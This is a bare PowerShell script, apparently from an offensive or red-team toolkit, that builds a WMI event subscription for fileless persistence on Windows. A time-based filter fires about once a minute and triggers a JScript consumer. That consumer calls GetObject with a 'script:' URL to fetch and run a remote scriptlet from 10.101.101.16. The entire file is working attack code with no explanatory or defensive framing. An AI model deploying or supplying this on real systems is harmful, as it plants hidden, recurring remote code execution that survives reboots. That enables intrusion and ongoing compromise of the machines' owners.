$filterName = 'filtP1'
$consumerName = 'consP1'
$Command ="GetObject(""script:http://10.101.101.16/mof.txt"")"    


$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance Isa 'Win32_LocalTime' And TargetInstance.Second = 1"    

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop    

$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ScriptingEngine='JScript';ScriptText=$Command}    

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}